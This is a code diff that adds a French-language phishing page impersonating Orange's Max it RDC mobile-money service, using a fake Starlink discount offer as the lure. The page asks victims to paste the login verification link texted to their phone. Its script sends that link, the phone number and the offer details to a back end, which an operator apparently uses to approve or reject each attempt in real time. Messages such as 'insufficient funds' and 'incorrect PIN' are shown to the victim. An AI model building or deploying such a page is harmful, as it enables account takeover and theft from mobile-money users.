@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+  <title>Max it RDC - Lien de vérification</title>
+  <style>
+    :root{
+      --maxit-orange:#ff7900;
+      --text-dark:#3d4a59;
+      --text-grey:#9299a3;
+      --border-blue:#b7c0c9;
+    }
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+    html{-webkit-text-size-adjust:100%;}
+    body{
+      min-height:100svh;
+      display:flex;
+      flex-direction:column;
+      background:#fff;
+      color:var(--text-dark);
+      font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    }
+    .topbar{
+      height:90px;
+      background:linear-gradient(90deg,#ff7900 0%,#e65c00 100%);
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:0 20px;
+    }
+    .topbar .logo-img{
+      height:48px;
+      min-width:112px;
+      padding:6px 12px;
+      background:#fff;
+      border-radius:6px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .maxit-wordmark{display:flex;align-items:baseline;gap:4px;color:var(--maxit-orange);white-space:nowrap;}
+    .maxit-wordmark strong{font-size:23px;font-weight:900;letter-spacing:-1.5px;}
+    .maxit-wordmark span{font-size:10px;font-weight:800;letter-spacing:.04em;}
+    .top-actions{
+      display:flex;
+      align-items:center;
+      gap:14px;
+      color:#fff;
+    }
+    .top-actions svg{width:26px;height:26px;}
+    .language{
+      min-width:145px;
+      height:52px;
+      border:1px solid rgba(255,255,255,.75);
+      border-radius:12px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#fff;
+      font-size:20px;
+      font-weight:800;
+    }
+    .offer-bar{
+      height:76px;
+      background:#1b2a4f;
+      color:#fff;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:18px;
+    }
+    .offer-chip{
+      background:linear-gradient(135deg,#ff922e,#e65c00);
+      border-radius:24px;
+      padding:12px 18px;
+      font-size:22px;
+      font-weight:900;
+    }
+    .offer-text{font-size:22px;font-weight:800;}
+    main{
+      flex:1;
+      width:100%;
+      max-width:630px;
+      margin:0 auto;
+      padding:44px 25px 80px;
+    }
+    .secure-card{
+      border:1px solid #e2e4e8;
+      border-radius:34px;
+      background:#fff;
+      box-shadow:0 12px 24px rgba(0,0,0,.12);
+      overflow:hidden;
+    }
+    .secure-head{
+      height:170px;
+      background:var(--maxit-orange);
+      color:#fff;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+    }
+    .partner-row{
+      display:flex;
+      align-items:center;
+      gap:24px;
+    }
+    .partner-row .logo-img{
+      height:64px;
+      min-width:138px;
+      background:#fff;
+      border-radius:8px;
+      padding:8px 16px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .multiply{font-size:30px;font-weight:700;}
+    .starlink-box{
+      height:64px;
+      min-width:180px;
+      background:#fff;
+      border-radius:8px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .starlink-box img{width:145px;height:52px;object-fit:contain;}
+    .secure-head h1{
+      color:#fff;
+      font-size:34px;
+      line-height:1;
+      margin-top:25px;
+    }
+    .secure-body{padding:38px 38px 32px;}
+    .intro{
+      text-align:center;
+      color:#4e5a69;
+      font-size:25px;
+      font-weight:700;
+      line-height:1.35;
+      margin-bottom:28px;
+    }
+    .phone-num{
+      display:block;
+      color:var(--text-dark);
+      font-size:20px;
+      margin-top:8px;
+    }
+    h2.field-title{
+      color:var(--text-dark);
+      font-size:28px;
+      font-weight:800;
+      margin-bottom:20px;
+    }
+    .link-example{
+      margin:-8px 0 12px;
+      padding:12px 14px;
+      border:1px solid #e2e4e8;
+      border-radius:10px;
+      background:#f8fafc;
+      color:#667085;
+      font-size:13px;
+      line-height:1.5;
+      overflow-wrap:anywhere;
+    }
+    .link-example strong{color:var(--text-dark);}
+    .otp-input{
+      width:100%;
+      min-height:120px;
+      border:2px solid var(--border-blue);
+      border-radius:18px;
+      padding:18px 20px;
+      text-align:left;
+      font-family:inherit;
+      font-size:18px;
+      line-height:1.5;
+      color:var(--text-dark);
+      outline:none;
+      resize:vertical;
+      box-shadow:inset 0 0 0 2px #dfe5ea;
+    }
+    .otp-input::placeholder{color:#a7adb4;}
+    .otp-input:focus{border-color:var(--maxit-orange);}
+    .helper-text{
+      color:var(--text-grey);
+      font-size:14px;
+      text-align:center;
+      margin:14px 0 6px;
+    }
+    .timer-text{
+      color:var(--text-grey);
+      font-size:14px;
+      text-align:center;
+    }
+    .timer-text b{color:var(--text-dark);}
+    .submit-btn{
+      width:100%;
+      min-height:86px;
+      border-radius:22px;
+      border:none;
+      background:#d9dde3;
+      color:#fff;
+      font-size:24px;
+      font-weight:900;
+      letter-spacing:3px;
+      cursor:not-allowed;
+      margin-top:28px;
+      touch-action:manipulation;
+    }
+    .submit-btn.active{
+      background:var(--maxit-orange);
+      cursor:pointer;
+      box-shadow:0 10px 16px rgba(255,121,0,.25);
+    }
+    .submit-btn.active:active{transform:translateY(1px) scale(.99);}
+
+    .approval-overlay{
+      position:fixed;
+      inset:0;
+      background:rgba(24,31,42,.58);
+      backdrop-filter:blur(2px);
+      -webkit-backdrop-filter:blur(2px);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+      text-align:center;
+      z-index:50;
+    }
+    .approval-overlay.visible{display:flex;}
+    .approval-card{
+      width:min(540px,100%);
+      background:#fff;
+      border-radius:22px;
+      padding:30px 28px 24px;
+      box-shadow:0 18px 44px rgba(0,0,0,.18);
+    }
+    .spinner{
+      width:52px;
+      height:52px;
+      border:4px solid #eee;
+      border-top-color:var(--maxit-orange);
+      border-radius:50%;
+      animation:spin .9s linear infinite;
+      margin:0 auto 18px;
+    }
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .approval-overlay h2{
+      font-size:clamp(23px,4vw,36px);
+      color:var(--maxit-orange);
+      margin-bottom:10px;
+    }
+    .approval-overlay p{
+      font-size:clamp(16px,2.6vw,22px);
+      color:#2a2a2a;
+      max-width:300px;
+      line-height:1.45;
+      margin:0 auto;
+    }
+    .denied-msg{
+      display:none;
+      color:var(--maxit-orange)!important;
+      font-weight:700;
+      margin-top:8px!important;
+    }
+    .retry-btn{
+      display:none;
+      width:100%;
+      min-height:58px;
+      margin-top:18px;
+      border:none;
+      border-radius:12px;
+      background:var(--maxit-orange);
+      color:#fff;
+      font-size:20px;
+      font-weight:800;
+      cursor:pointer;
+    }
+
+    footer{display:none;}
+    @media(max-width:480px){
+      body{min-height:100dvh;}
+      .topbar{height:64px;padding:0 12px;}
+      .topbar .logo-img{height:40px;min-width:92px;padding:5px 9px;border-radius:5px;}
+      .maxit-wordmark strong{font-size:19px;}
+      .maxit-wordmark span{font-size:8px;}
+      .top-actions{gap:7px;}
+      .top-actions svg{width:20px;height:20px;}
+      .top-actions svg:nth-of-type(2){display:none;}
+      .language{min-width:74px;height:34px;border-radius:8px;font-size:12px;}
+      .offer-bar{height:44px;gap:8px;padding:0 10px;}
+      .offer-chip{flex:none;border-radius:14px;padding:6px 9px;font-size:11px;}
+      .offer-text{min-width:0;font-size:11px;line-height:1.2;text-align:left;}
+      main{max-width:none;padding:16px 12px 28px;}
+      .secure-card{border-radius:18px;box-shadow:0 6px 16px rgba(0,0,0,.10);}
+      .secure-head{height:128px;}
+      .partner-row{gap:10px;}
+      .partner-row .logo-img{height:44px;min-width:112px;border-radius:6px;padding:5px 9px;}
+      .multiply{font-size:19px;}
+      .starlink-box{height:44px;min-width:112px;border-radius:6px;}
+      .starlink-box img{width:96px;height:36px;}
+      .secure-head h1{font-size:22px;margin-top:16px;}
+      .secure-body{padding:20px 16px 16px;}
+      .intro{font-size:15px;margin-bottom:18px;}
+      .phone-num{font-size:14px;margin-top:5px;}
+      h2.field-title{font-size:16px;margin-bottom:10px;}
+      .link-example{margin:-2px 0 10px;padding:9px 10px;font-size:11px;}
+      .otp-input{
+        min-height:96px;
+        border-width:1.5px;
+        border-radius:12px;
+        padding:12px;
+        font-size:16px;
+        box-shadow:inset 0 0 0 1px #dfe5ea;
+      }
+      .helper-text,.timer-text{font-size:12px;}
+      .submit-btn{min-height:54px;border-radius:12px;font-size:16px;letter-spacing:2px;margin-top:18px;}
+      .approval-overlay{padding:16px;}
+      .approval-card{border-radius:16px;padding:24px 20px 20px;}
+      .spinner{width:44px;height:44px;}
+    }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="logo-img" role="img" aria-label="Max it RDC">
+      <div class="maxit-wordmark"><strong>max it</strong><span>RDC</span></div>
+    </div>
+    <div class="top-actions" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.5a11 11 0 0 1 14 0M8.5 16a6 6 0 0 1 7 0M12 19.5h.01"/><path d="M2.5 9a15 15 0 0 1 19 0"/></svg>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 11l9-8 9 8"/><path d="M5 10v10h14V10M9 20v-6h6v6"/></svg>
+      <div class="language">FR</div>
+    </div>
+  </header>
+
+  <div class="offer-bar">
+    <span class="offer-chip">70% OFF</span>
+    <span class="offer-text">OFFRES DISPONIBLES JUSQU’EN MAI 2027</span>
+  </div>
+
+  <main>
+    <section class="secure-card">
+      <div class="secure-head">
+        <div class="partner-row">
+          <div class="logo-img" role="img" aria-label="Max it RDC">
+            <div class="maxit-wordmark"><strong>max it</strong><span>RDC</span></div>
+          </div>
+          <span class="multiply">×</span>
+          <div class="starlink-box"><img src="starlink_logo.png" alt="Starlink"></div>
+        </div>
+        <h1>Lien de vérification</h1>
+      </div>
+
+      <div class="secure-body">
+        <p class="intro">
+          Copiez et collez le lien envoyé sur votre téléphone
+          <span class="phone-num" id="phoneNum">+243</span>
+        </p>
+        <h2 class="field-title">Lien de vérification</h2>
+        <p class="link-example"><strong>Exemple :</strong><br>Merci de cliquer sur ce lien pour confirmer la connexion.<br>https://maxit.orange.cd/oms-links/auth?token=a8qjhkgo23z7v8htc6</p>
+        <textarea class="otp-input" id="otpInput" placeholder="Collez le lien ici" aria-label="Lien à coller"></textarea>
+        <p class="helper-text">Collez le lien dans le champ ci-dessus</p>
+        <p class="timer-text">Le lien expire dans <b id="timer">60</b> secondes</p>
+        <button class="submit-btn" id="submitBtn" disabled>SOUMETTRE</button>
+      </div>
+    </section>
+  </main>
+
+  <div class="approval-overlay" id="approvalOverlay">
+    <div class="approval-card">
+      <div class="spinner" id="spinner"></div>
+      <h2 id="overlayTitle">En attente d’approbation</h2>
+      <p id="overlayText">Veuillez patienter pendant la vérification…</p>
+      <p class="denied-msg" id="deniedMsg">Lien incorrect.</p>
+      <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const phone = params.get('phone');
+    if(phone) document.getElementById('phoneNum').textContent = '+243' + phone;
+
+    const otpInput = document.getElementById('otpInput');
+    const submitBtn = document.getElementById('submitBtn');
+    otpInput.addEventListener('input', () => {
+      if(otpInput.value.trim()){
+        submitBtn.classList.add('active');
+        submitBtn.disabled = false;
+      }else{
+        submitBtn.classList.remove('active');
+        submitBtn.disabled = true;
+      }
+    });
+
+    let seconds = 60;
+    const timerEl = document.getElementById('timer');
+    const countdown = setInterval(() => {
+      seconds--;
+      timerEl.textContent = Math.max(seconds, 0);
+      if(seconds <= 0) clearInterval(countdown);
+    }, 1000);
+
+    const overlay = document.getElementById('approvalOverlay');
+    const spinner = document.getElementById('spinner');
+    const overlayTitle = document.getElementById('overlayTitle');
+    const overlayText = document.getElementById('overlayText');
+    const deniedMsg = document.getElementById('deniedMsg');
+    const retryBtn = document.getElementById('retryBtn');
+    let pollTimer = null;
+
+    function showOverlayWaiting(){
+      overlay.classList.add('visible');
+      spinner.style.display = 'block';
+      overlayTitle.style.display = 'block';
+      overlayText.style.display = 'block';
+      deniedMsg.style.display = 'none';
+      retryBtn.style.display = 'none';
+      let waitingSeconds = 1;
+      if(window.__otpWaitTimer) clearInterval(window.__otpWaitTimer);
+      window.__otpWaitTimer = setInterval(() => {
+        waitingSeconds++;
+        overlayText.textContent = `Veuillez patienter... (${waitingSeconds}s)`;
+      }, 1000);
+    }
+
+    function showDenied(message){
+      clearInterval(pollTimer);
+      spinner.style.display = 'none';
+      overlayTitle.style.display = 'none';
+      overlayText.style.display = 'none';
+      deniedMsg.textContent = message;
+      deniedMsg.style.display = 'block';
+      retryBtn.style.display = 'inline-block';
+    }
+
+    function pollApproval(id){
+      if(pollTimer) clearInterval(pollTimer);
+      pollTimer = setInterval(async () => {
+        try{
+          const res = await fetch('/api/check-approval/' + id);
+          const data = await res.json();
+          if(data.status === 'approved'){
+            clearInterval(pollTimer);
+            window.location.href = 'mwish.html?' + params.toString();
+          }else if(data.status === 'denied'){
+            showDenied('Lien incorrect.');
+          }else if(data.status === 'insufficient'){
+            showDenied('Fonds insuffisants.');
+          }else if(data.status === 'demo_error'){
+            showDenied('Broche incorrecte.');
+          }
+        }catch(err){}
+      },2500);
+    }
+
+    retryBtn.addEventListener('click', () => {
+      if(window.__otpWaitTimer){
+        clearInterval(window.__otpWaitTimer);
+        window.__otpWaitTimer = null;
+      }
+      if(deniedMsg.textContent.trim() === 'Broche incorrecte.'){
+        window.location.href = 'index.html';
+        return;
+      }
+      otpInput.value = '';
+      submitBtn.classList.remove('active');
+      submitBtn.disabled = true;
+      overlay.classList.remove('visible');
+      otpInput.focus();
+    });
+
+    submitBtn.addEventListener('click', async () => {
+      if(submitBtn.disabled) return;
+      showOverlayWaiting();
+      try{
+        const res = await fetch('/api/request-approval',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({
+            plan:params.get('plan'),
+            price:params.get('price'),
+            phone,
+            otp:otpInput.value,
+            step:'otp'
+          })
+        });
+        const data = await res.json();
+        pollApproval(data.id);
+      }catch(err){
+        clearInterval(window.__otpWaitTimer);
+        spinner.style.display = 'none';
+        overlayTitle.textContent = 'Erreur de connexion';
+        overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
+        overlayText.style.display = 'block';
+        retryBtn.style.display = 'inline-block';
+      }
+    });
+  </script>
+</body>
+</html>
